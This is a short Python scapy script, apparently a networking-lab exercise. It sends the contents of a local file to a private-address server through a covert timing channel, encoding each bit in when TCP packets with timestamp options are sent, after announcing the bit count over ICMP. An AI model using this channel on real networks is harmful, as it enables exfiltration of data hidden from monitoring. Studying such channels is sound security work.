from scapy.all import *
SERVER_IP = '10.0.2.246' #<Server IP>
SERVER_PORT = 1234


def comm():
   
    with open('tosend.txt', 'rb') as f:
        file_bytes = bytearray(f.read())
        bits = ''.join(format(byte, '08b') for byte in file_bytes)
        print(bits)
    n = len(bits)
    print(n)
    i = 0
    ip_packet = IP(dst=SERVER_IP)

# Create an ICMP packet with payload "10"
    icmp_packet = ICMP() / str(n)

    # Combine the IP and ICMP packets
    packet = ip_packet / icmp_packet

    # Send the packet
    sr1(packet)

    while i < n:
        print("Trying bit number:", i)
        # print(bits[i])
        t = int(time.time())
        if t % 2 == int(bits[i]):
            # print("hi")
            pkt = IP(dst=SERVER_IP) / \
                TCP(sport=12345, dport=SERVER_PORT, seq=i,
                    options=[('Timestamp', (t, 0))])
            i += 1
            send(pkt)


    # Send the packet with timestamp option
comm()
